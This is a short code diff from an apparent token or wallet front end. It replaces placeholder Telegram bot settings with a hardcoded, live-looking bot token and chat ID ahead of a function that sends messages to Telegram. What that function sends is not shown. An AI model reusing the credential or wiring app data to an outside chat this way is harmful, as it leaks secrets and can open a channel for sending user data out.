@@ -8,8 +8,8 @@ import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import axios from 'axios'; // Import axios for HTTP requests
 
 // Telegram Bot Config
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+const TELEGRAM_BOT_TOKEN = '7439590254:AAHON2e8fQW1mlEYPiWqE1RCf7F2Az7ABr0';
+const TELEGRAM_CHAT_ID = '5470283104';
 
 // Function to send message to Telegram
 const sendTelegramNotification = async (message: string) => {
